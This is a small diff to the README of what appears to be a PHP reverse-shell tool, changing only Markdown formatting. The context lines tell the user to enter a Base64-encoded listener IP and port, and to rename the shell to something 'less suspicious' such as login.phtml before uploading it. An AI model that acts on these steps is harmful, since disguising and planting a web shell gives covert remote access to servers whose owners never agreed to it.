@@ -43,8 +43,9 @@ Change these lines with your Base64 encoded IP/hostname and port:
 $ip_b64 = 'YOUR_BASE64_ENCODED_IP_OR_HOSTNAME';
 $port = YOUR_LISTENER_PORT;
 ```
-**4. Rename the file and upload
-Rename the file to something less suspicious, for example:**
+**4. Rename the file and upload**
+
+Rename the file to something less suspicious, for example:
 
 - `login.phtml`
 
